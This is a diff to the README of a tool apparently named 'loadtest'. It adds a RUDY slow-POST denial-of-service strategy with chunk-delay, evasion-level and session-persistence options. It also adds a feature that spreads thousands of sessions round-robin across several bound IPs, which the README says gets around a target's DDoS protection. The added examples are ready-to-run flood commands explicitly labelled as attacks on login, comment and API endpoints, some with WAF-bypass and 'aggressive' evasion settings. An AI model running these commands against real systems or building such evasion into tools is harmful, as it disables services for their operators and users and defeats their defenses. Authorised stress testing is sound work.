@@ -124,6 +124,16 @@ make build
 | `--stealth` | `false` | Enable browser fingerprint headers (Sec-Fetch-*) for WAF bypass |
 | `--randomize` | `false` | Enable realistic query strings for cache bypass |
 | `--analyze-latency` | `false` | Enable response time percentile analysis (p50, p95, p99) |
+| `--chunk-delay-min` | `1s` | Minimum delay between chunks for rudy |
+| `--chunk-delay-max` | `5s` | Maximum delay between chunks for rudy |
+| `--chunk-size-min` | `1` | Minimum chunk size in bytes for rudy |
+| `--chunk-size-max` | `100` | Maximum chunk size in bytes for rudy |
+| `--persist` | `true` | Enable persistent connections for rudy |
+| `--max-req-per-session` | `10` | Maximum requests per session for rudy |
+| `--keepalive-timeout` | `600s` | Keep-alive timeout for rudy |
+| `--use-json` | `false` | Use JSON encoding for rudy |
+| `--use-multipart` | `false` | Use multipart/form-data encoding for rudy |
+| `--evasion-level` | `2` | Evasion level for rudy (1=basic, 2=normal, 3=aggressive) |
 
 ### Available Strategies
 
@@ -138,6 +148,7 @@ make build
 | `http-flood` | High-volume request flooding |
 | `h2-flood` | HTTP/2 multiplexing flood |
 | `heavy-payload` | Application-layer stress with heavy payloads |
+| `rudy` | R-U-Dead-Yet slow POST with session persistence |
 
 ## Examples
 
@@ -219,7 +230,48 @@ setting `--strategy slowloris` alongside a valid HTTP URL.
   --duration 30s
 ```
 
-### 6. Multi-IP Load Distribution
+### 6. RUDY (R-U-Dead-Yet) Slow POST Attack
+
+```bash
+# Basic RUDY attack with default settings
+./loadtest \
+  --target http://example.com/login \
+  --strategy rudy \
+  --sessions 3000 \
+  --rate 100 \
+  --duration 5m
+
+# Very slow attack with small chunks
+./loadtest \
+  --target http://example.com/submit \
+  --strategy rudy \
+  --sessions 5000 \
+  --content-length 1000000 \
+  --chunk-size-min 1 \
+  --chunk-size-max 10 \
+  --chunk-delay-min 10s \
+  --chunk-delay-max 30s
+
+# JSON-based RUDY attack with session persistence
+./loadtest \
+  --target https://api.example.com/v1/submit \
+  --strategy rudy \
+  --sessions 2000 \
+  --use-json \
+  --persist \
+  --max-req-per-session 10
+
+# High-evasion attack with aggressive headers
+./loadtest \
+  --target http://example.com/comment \
+  --strategy rudy \
+  --sessions 6000 \
+  --evasion-level 3 \
+  --randomize \
+  --duration 600s
+```
+
+### 7. Multi-IP Load Distribution
 
 ```bash
 # Single IP (limited to ~2,400 sessions by target DDoS protection)
@@ -228,14 +280,22 @@ setting `--strategy slowloris` alongside a valid HTTP URL.
   --sessions 2000 \
   --rate 500
 
-# Bind to specific NIC to bypass rate limits
+# Single IP binding
 ./loadtest \
   --target http://example.com \
   --sessions 2000 \
   --rate 500 \
   --bind-ip 192.168.1.101
 
-# Multiple IPs (manual distribution across 7 NICs = ~14,000 total sessions)
+# Multiple IPs with automatic round-robin distribution (NEW!)
+# All connections distributed across 7 IPs automatically
+./loadtest \
+  --target http://example.com \
+  --sessions 14000 \
+  --rate 2000 \
+  --bind-ip "192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.104,192.168.1.105,192.168.1.106,192.168.1.107"
+
+# Legacy: Manual distribution across multiple processes
 ./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.101 &
 ./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.102 &
 ./loadtest --target http://example.com --sessions 2000 --bind-ip 192.168.1.103 &
